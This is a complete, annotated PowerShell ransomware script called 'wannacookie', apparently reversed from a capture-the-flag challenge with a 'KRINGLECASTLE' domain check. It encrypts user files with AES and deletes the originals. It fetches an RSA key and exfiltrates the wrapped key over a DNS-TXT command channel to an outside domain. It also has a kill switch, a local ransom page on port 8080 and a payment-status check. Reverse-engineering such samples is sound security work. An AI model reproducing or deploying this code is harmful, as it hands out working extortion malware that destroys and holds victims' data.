$functions = {
	# Encrypt or Decrypt a file with AES 128 bits CBC
	# if $enc_it = true -> encrypt, else -> decrypt
	# ".wannacookie" suffix is added to encrypted files
	function e_d_file($key, $File, $enc_it) {
		[byte[]] $key = $key;
		$Suffix = "`.wannacookie";
		[System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
		[System.Int32] $KeySize = $key.Length * 8; # $key.Length = 16 bytes -> $KeySize = 128 bits
		$AESP = New-Object 'System.Security.Cryptography.AesManaged';
		$AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
		$AESP.BlockSize = 128;
		$AESP.KeySize = $KeySize;
		$AESP.Key = $key;
		$FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open);
		if ($enc_it) {
			$DestFile = $File + $Suffix
		} else {
			$DestFile = ($File -replace $Suffix)
		};
		$FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create);
		if ($enc_it) {
			$AESP.GenerateIV();
			$FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4); # store IV Len in first 4 bytes
			$FileSW.Write($AESP.IV, 0, $AESP.IV.Length); # then store IV value
			$Transform = $AESP.CreateEncryptor()
		} else {
			[Byte[]] $LenIV = New-Object Byte[] 4;
			$FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null;
			$FileSR.Read($LenIV, 0, 3) | Out-Null;
			[Int] $LIV = [System.BitConverter]::ToInt32($LenIV, 0);
			[Byte[]] $IV = New-Object Byte[] $LIV;
			$FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null;
			$FileSR.Read($IV, 0, $LIV) | Out-Null;
			$AESP.IV = $IV;
			$Transform = $AESP.CreateDecryptor()
		};
		$CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write);
		[Int] $Count = 0;
		[Int] $BlockSzBts = $AESP.BlockSize / 8; # block size = 16 bytes
		[Byte[]] $Data = New-Object Byte[] $BlockSzBts;
		Do {
			$Count = $FileSR.Read($Data, 0, $BlockSzBts);
			$CryptoS.Write($Data, 0, $Count)
		}
		While($Count -gt 0);
		$CryptoS.FlushFinalBlock();
		$CryptoS.Close();
		$FileSR.Close();
		$FileSW.Close();
		Clear-variable -Name "key";
		Remove-Item $File
	}
};

# hex string to byte array
function H2B {
	param($HX);
	$HX = $HX -split '(..)' | ? {$_};
	ForEach($value in $HX) {
		[Convert]::ToInt32($value, 16)
	}
};

# ASCII to hex string
function A2H() {
	Param($a);
	$c = '';
	$b = $a.ToCharArray();
	Foreach($element in $b) {
		$c = $c + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))
	};
	return $c -replace ' '
};

# hex string to ASCII
function H2A() {
	Param($a);
	$outa;
	$a -split '(..)' | ? {$_} | forEach {[char]([convert]::toint16($_, 16))} | forEach {$outa = $outa + $_};
	return $outa
};

# byte array to hex string
function B2H {
	param($DEC);
	$tmp = '';
	ForEach($value in $DEC) {
		$a = "{0:x}" -f [Int] $value;
		if ($a.length -eq 1) {
			$tmp += '0' + $a
		} else {
			$tmp += $a
		}
	};
	return $tmp
};

# XOR arg1 arg2
function ti_rox {
	param($b1, $b2);
	$b1 = $(H2B $b1);
	$b2 = $(H2B $b2);
	$cont = New-Object Byte[] $b1.count;
	if ($b1.count -eq $b2.count) {
		for ($i = 0; $i -lt $b1.count; $i++) {
			$cont[$i] = $b1[$i] -bxor $b2[$i]
		}
	};
	return $cont
};

# Compress byte array with Gzip
function B2G {
	param([byte[]] $Data);
	Process {
		$out = [System.IO.MemoryStream]::new();
		$gStream = New-Object System.IO.Compression.GzipStream $out, ([IO.Compression.CompressionMode]::Compress);
		$gStream.Write($Data, 0, $Data.Length);
		$gStream.Close();
		return $out.ToArray()
	}
};

# Decompress Gzip data to byte array
function G2B {
	param([byte[]] $Data);
	Process {
		$SrcData = New-Object System.IO.MemoryStream(, $Data);
		$output = New-Object System.IO.MemoryStream;
		$gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress);
		$gStream.CopyTo($output);
		$gStream.Close();
		$SrcData.Close();
		[byte[]] $byteArr = $output.ToArray();
		return $byteArr
	}
};

# Compute string SHA1 hash
function sh1([String] $String) {
	$SB = New-Object System.Text.StringBuilder;
	[System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String)) | % {[Void] $SB.Append($_.ToString("x2"))};
	$SB.ToString()
};

# Public key encryption
function p_k_e($key_bytes, [byte[]] $pub_bytes) {
	$cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;
	$cert.Import($pub_bytes);
	$encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true); # OAEP padding used as second arg is true
	return $(B2H $encKey)
};

# Encrypt or Decrypt list of files
function e_n_d {
	param($key, $allfiles, $make_cookie);
	$tcount = 12;
	for ($file = 0; $file -lt $allfiles.length; $file++) {
		while ($true) {
			$running = @(Get-Job | Where-Object {$_.State -eq 'Running'});
			if ($running.Count -le $tcount) {
				Start-Job -ScriptBlock {
					param($key, $File, $true_false);
					try {
						e_d_file $key $File $true_false
					} catch {
						$_.Exception.Message | Out-String | Out-File $($env:userprofile + '\Desktop\ps_log.txt') -append
					}
				} -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions;
				break
			} else {
				Start-Sleep -m 200;
				continue
			}
		}
	}
};

# Given a filename in hex form, retrieve it from ransomware server using DNS TXT requests
function g_o_dns($f) {
	$h = '';
	foreach($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings, 10) - 1)) {
		$h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings
	};
	return (H2A $h)
};

# string to array of chunks of size = $size
function s_2_c($astring, $size = 32) {
	$new_arr = @();
	$chunk_index = 0;
	foreach($i in 1..$($astring.length / $size)) {
		$new_arr += @($astring.substring($chunk_index, $size));
		$chunk_index += $size
	};
	return $new_arr
};

# Send encrypted key to ransomware server in chunks and return key ID
# "6B6579666F72626F746964" -> "keyforbotid"
function snd_k($enc_k) {
	$chunks = (s_2_c $enc_k);
	foreach($j in $chunks) {
		if ($chunks.IndexOf($j) -eq 0) {
			$n_c_id = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
		} else {
			$(Resolve-DnsName -Server erohetfanu.com -Name "$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
		}
	};
	return $n_c_id
};

# main function
function wanc {
	$S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";

	# if "yippeekiyaa.aaay" resolves -> exit <- KILL SWITCH
	# "6B696C6C737769746368" -> killswitch
	if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {
		return
	};

	# if host already infected or host domain name not equal to "KRINGLECASTLE" -> exit
	# (once infected a local website is launched on port 8080)
	if ($(netstat -ano | Select-String "127.0.0.1:8080").length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") {
		return
	};

	# get public key from ransomware server: "7365727665722E637274" -> "server.crt"
	$p_k = [System.Convert]::FromBase64String($(g_o_dns("7365727665722E637274")));
	# create random 16 bytes key
	$b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char] 01..[char] 255) + ([char[]]([char] 01..[char] 255)) + 0..9 | sort {Get-Random})[0..15] -join '')) | ? {$_ -ne 0x00});
	# key bytes to hex key
	$h_k = $(B2H $b_k);
	# SHA1(hex key)
	$k_h = $(sh1 $h_k);
	# encrypt key with public key
	$p_k_e_k = (p_k_e $b_k $p_k).ToString();
	# send encrypted key to ransomware server and get key ID
	$c_id = (snd_k $p_k_e_k);
	# get current date/time
	$d_t = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n");
	# create array of files to encrypt: all *.elfdb files in user profile
	[array] $f_c = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile + '\Desktop'), $($env:userprofile + '\Documents'), $($env:userprofile + '\Videos'), $($env:userprofile + '\Pictures'), $($env:userprofile + '\Music')) -Recurse | where {!$_.PSIsContainer} | Foreach-Object {$_.Fullname});
	# Encrypt files
	e_n_d $b_k $f_c $true;
	# Delete hex key and and byte key <- ENCRYPTED KEY $p_k_e_k IS KEPT IN MEMORY
	Clear-variable -Name "h_k";
	Clear-variable -Name "b_k";

	# Spawn local website on port 8080
	$lurl = 'http://127.0.0.1:8080/';
	$html_c = @{
		'GET /' = $(g_o_dns(A2H "source.min.html")); # g_o_dns("736f757263652e6d696e2e68746d6c")
		'GET /close' = '<p>Bye!</p>'
	};
	Start-Job -ScriptBlock {
		param($url);
		Start-Sleep 10;
		Add-type -AssemblyName System.Windows.Forms;
		start-process "$url" -WindowStyle Maximized;
		Start-sleep 2;
		[System.Windows.Forms.SendKeys]::SendWait("{F11}")
	} -Arg $lurl;
	$list = New-Object System.Net.HttpListener;
	$list.Prefixes.Add($lurl);
	$list.Start();
	try {
		$close = $false;
		while ($list.IsListening) {
			$context = $list.GetContext();
			$Req = $context.Request;
			$Resp = $context.Response;
			$recvd = '{0} {1}' -f $Req.httpmethod, $Req.url.localpath;
			# GET / -> show source.min.html
			if ($recvd -eq 'GET /') {
				$html = $html_c[$recvd]
			}
			# GET /decrypt?key=1234 -> try to decrypt data with key=1234
			elseif($recvd -eq 'GET /decrypt') {
				$akey = $Req.QueryString.Item("key");
				# check key SHA1 hash
				if ($k_h -eq $(sh1 $akey)) {
					$akey = $(H2B $akey);
	 				# create list of all encrypted files in user profile
					[array] $f_c = $(Get-ChildItem -Path $($env:userprofile) -Recurse -Filter *.wannacookie | where {!$_.PSIsContainer} | Foreach-Object {$_.Fullname});
					# Decrypt files
					e_n_d $akey $f_c $false;
					$html = "Files have been decrypted!";
					$close = $true
				} else {
					$html = "Invalid Key!"
				}
			}
			# GET /close -> <p>Bye!</p>
			elseif($recvd -eq 'GET /close') {
				$close = $true;
				$html = $html_c[$recvd]
			}
			# GET /cookie_is_paid -> return "46616c7365" -> "false" if not paid and shows "UNPAID", key ID and date time
			# if the ransom is paid the decryption key is returned
			elseif($recvd -eq 'GET /cookie_is_paid') {
				# "72616e736f6d697370616964" -> "ransomispaid"
				$c_n_k = $(Resolve-DnsName -Server erohetfanu.com -Name ("$c_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings;
				if ($c_n_k.length -eq 32) {
					$html = $c_n_k
				} else {
					$html = "UNPAID|$c_id|$d_t"
				}
			# any other page returns an 404 error
			} else {
				$Resp.statuscode = 404;
				$html = '<h1>404 Not Found</h1>'
			};
			$buffer = [Text.Encoding]::UTF8.GetBytes($html);
			$Resp.ContentLength64 = $buffer.length;
			$Resp.OutputStream.Write($buffer, 0, $buffer.length);
			$Resp.Close();
			if ($close) {
				$list.Stop();
				return
			}
		}
	} finally {
		$list.Stop()
	}
};
wanc;